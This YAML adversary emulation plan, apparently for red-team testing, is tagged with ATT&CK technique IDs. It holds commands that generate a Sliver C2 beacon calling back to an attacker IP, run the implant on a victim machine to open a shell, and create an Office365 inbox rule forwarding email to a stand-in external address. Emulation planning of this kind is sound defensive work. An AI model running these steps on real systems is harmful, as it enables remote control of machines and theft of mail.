  - emulation_plan_details:
      adversary_name: test
      creation_time: 2024-11-12 06:17:59 UTC+0000
  - uuid: 972f9f15-94e5-4b3f-a97a-053d1f8f7a98
    name: Sliver Windows Implant Generation
    id: T1071.004
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - 'Application Layer Protocol: Encrypted Channel'
    description: |
      Sliver generates implant for Windows platform and enables mtls monitoring.
    executor:
      command: |
        sliver > generate beacon --arch amd64 --os  windows --mtls 192.168.130.128 --save .
        sliver > mtls
    arguments:
      attacker_ip:
        default:
        description: IP address of the attacker machine
        type:
      target_platform:
        default: windows
        description: The operating system type of the victim machine
        type:
    preconditions: []
    effects:
      - (prepared_sliver_implant)
  - uuid: 4a31f8db-89db-4f16-baab-47bb3f9d5b8a
    name:
    id:
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
    description:
    executor:
      command: |
        Manually download the sliver implant and execute it on the victim's machine
        sliver > sessions -i session_id //interact with a session
    arguments:
    preconditions:
      - (prepared_sliver_implant)
    effects:
      - (sliver_session)
  - uuid: 8315686c-035b-415e-9069-2e14799421e5
    name: Interactive Shell Access via Sliver
    id: T1059
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique: Command and Scripting Interpreter
    description: In the context of the Sliver framework, the command `shell` is used
      to open an interactive shell on the compromised machine associated with the
      active session.
    executor:
      command: |
        sliver (SESSION_NAME) > shell
    arguments:
    preconditions:
      - (sliver_session)
    effects:
      - (CAP_powershell_access ?e - executable)
  - uuid: 3234117e-151d-4254-9150-3d0bac41e38c
    name: Office365 - Email Forwarding
    id: T1114.003
    source: ART
    supported_platforms:
      - office-365
    tactics:
      - Collection
    technique: 'Email Collection: Email Forwarding Rule'
    description: |
      Creates a new Inbox Rule to forward emails to an external user via the "ForwardTo" property of the New-InboxRule Powershell cmdlet.
    executor:
      command: |
        $secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force
        $creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd
        Connect-ExchangeOnline -Credential $creds
        New-InboxRule -Name "#{rule_name}" -ForwardTo "#{forwarding_email}"
      cleanup_command: |
        $secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force
        $creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd
        Connect-ExchangeOnline -Credential $creds
        Get-InboxRule | Where-Object { $_.Name -eq "#{rule_name}" | ForEach-Object { Remove-InboxRule -Identity $_.Identity -Force -Confirm:$False }
      name: powershell
      elevation_required: false
    arguments:
      username:
        description: office-365 username
        type: string
        default:
      password:
        description: office-365 password
        type: string
        default:
      rule_name:
        description: email rule name
        type: string
        default: Atomic Red Team Email Rule
      forwarding_email:
        description: destination email addresses
        type: string
        default: Atomic_Operator@fakeemail.aq
    dependencies:
      - description: |
          ExchangeOnlineManagement PowerShell module must be installed. Your user must also have an Exchange license. 
        prereq_command: |
          $RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable
           if (-not $RequiredModule) {exit 1}
          if (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}
        get_prereq_command: |
          Install-Module -Name ExchangeOnlineManagement         
           Import-Module ExchangeOnlineManagement
    preconditions:
      - (powershell)
    effects:
      - (forwards_email_to_attacker ?e - email)
